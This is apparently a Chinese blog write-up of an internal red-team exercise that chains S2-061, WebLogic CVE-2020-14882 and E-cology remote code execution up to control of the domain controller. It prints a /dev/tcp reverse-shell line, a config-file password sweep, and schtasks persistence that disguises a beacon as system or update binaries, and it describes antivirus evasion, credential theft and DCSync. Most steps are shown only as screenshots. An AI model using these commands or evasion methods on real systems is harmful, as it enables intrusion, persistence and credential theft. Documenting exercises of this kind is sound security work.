## 前言

年前部门内有个模拟对抗的比赛，记录下当时的过程，感谢导师带我玩。

渗透过程本身是一个试错的过程，所以只记录下过程中的有效步骤。

给定目标为域名，通过openvpn访问，于是先对\*.xxx.com进行子域名暴力破解，得到`test.xxx.com`等等子域名，对这些子域名批量目录扫描。通过人工筛选过滤，发现入口点：

![](../Images/dcea27d97f1fb29e0fa24a936d7e3de5.png)

## 第一层  

### S2-061

通过目录扫描发现`index.bak`，提示蛮明显的，直接用payload打就行了。

![](../Images/b2fcc89e66bb653e48038878f804edeb.png)

  
最开始的时候，防守队的同学没有起WAF规则，所以可以直接打，后来起规则了，就利用了`chunked-coding-converter`或发送大POST包进行绕过。

可出网，反弹shell，对payload`bash -i >& /dev/tcp/IP/PORT 0>&1`进行编码：http://www.jackson-t.ca/runtime-exec-payloads.html  

![](../Images/785b8e2b102531bbfe1c213e9c0b853c.png)

  
进行信息收集,配置文件搜索关键字password：  

```
find /  \\( -name '\*.conf' -o -name '\*.xml' \\) -exec grep  -ir 'password=' {} \; 2>/dev/null
```

![](../Images/a114c4ec1cf259f8b9fcf008353387a8.png)

  
利用收集的密码使用tomcat用户尝试密码复用登录ssh，tomcat123456可成功登录,可通过sudo直接提权，拿到root权限：  

![](../Images/03b44ccd7ac40579e444d4f86dc131cb.png)

  
可出网，跳板搭建可供选择：  

> NPS：https://github.com/ehang-io/nps  
> FRP：https://github.com/fatedier/frp

## 第二层

### CVE-2020-14882 WebLogic远程代码执行漏洞

使用一层跳板，对192.168.1.1/24进行全端口扫描，进行筛选后提取的有效的信息：

  

> `http://1``92.168.1.17/#/overview` apache fink
> 
>   
> `http://192.168.1.3:8001` weblogic

Apache FLink未授权上传jar包远程代码执行漏洞  
msf生成恶意jar文件，执行反弹shell，上线后发现为vulhub的docker环境。

![](../Images/c835d486cfc5fb2b5891d0baa19ea8e5.png)

![](../Images/6bfb51f2d46f9c078f2a76ffc858a713.png)

  
经探测存在CVE-2020-14882 14883漏洞，2021-01-20 13:50利用成功：

![](../Images/ff51424a75b9d0427ee7e073887a85bd.png)

  

![](../Images/315ec80670bc68f0b524ab76fafc876c.png)

`tasklist /svc`发现有某杀软A，利用**`certutil`**&**`bitsadmin`**下载payload均被拦截。  
写入vbs下载器，下载免杀exe，并执行上线CS：  

```



echo写入vbs脚本，运行脚本成功下载到1.xml：
```

## 第三层

  

### \*微OA E-cology 远程代码执行漏洞

  

使用二层weblogic跳板机作为代理，进行扫描发现\*微OA：

`http://10.1.1.3/login/Login.jsp?logintype=1`

![](../Images/0ad5624589381a7f06f5e5cd238131ee.png)  

`http://10.1.1.3/weaver/bsh.servlet.BshServlet` 可执行命令：

  

![](../Images/cc0f5bc3ed00f09aba580f1706f330fa.png)![](../Images/6e85d9a4d2ae3cc85c943d43ce45fec7.png)

  
将powershell可执行程序复制到其他目录并重命名，绕过某杀软B上线CS：

  

![](../Images/8e75db3d0be8b0db8aef0c67333968cd.png)![](../Images/4c25aaba497337aadbbf6b6c5d7096e8.png)

  

```

shell schtasks /create /SC DAILY /RU "NT Authority\SYSTEM" /TN "GoogleUpdateCheck" /TR "cmd /c start /b C:\windows\system32\scvhost.exe" /F
```

域内信息收集：

![](../Images/455ffaade5c3c02408094eeb46fd8521.png)

发现有域管理员运行的进程，凭证窃取&DCSync：  

  

![](../Images/6a6c8da7304500d60cb71a9f9ae96c44.png)

![](../Images/b41fe01a99f931f579f682184cc9a9af.png)  

![](../Images/47d534fd520bf3887e0bd5724ac2474c.png)

窃取令牌后，可获得域管理员权限，并可成功访问域控：

![](../Images/634a26037ba4588837eb2c76f066e02a.png)将

免杀cs beacon复制到域控：

![](../Images/eb94716ee723a4510d9fe663b6a9a985.png)

  

创建计划任务远程执行：  

  

```

shell schtasks /create /S dc-01 /SC DAILY  /RU "NT Authority\SYSTEM" /TN "MicrosoftUpdate"  /TR "c:\windows\system32\WinDefender.exe"  /F
```

![](../Images/ace2187e09ad1951427073b91bc4ea7e.png)

拿到域控权限：

![](../Images/a3d2ef7e12a10cc77387cfef4f7a68bb.png)
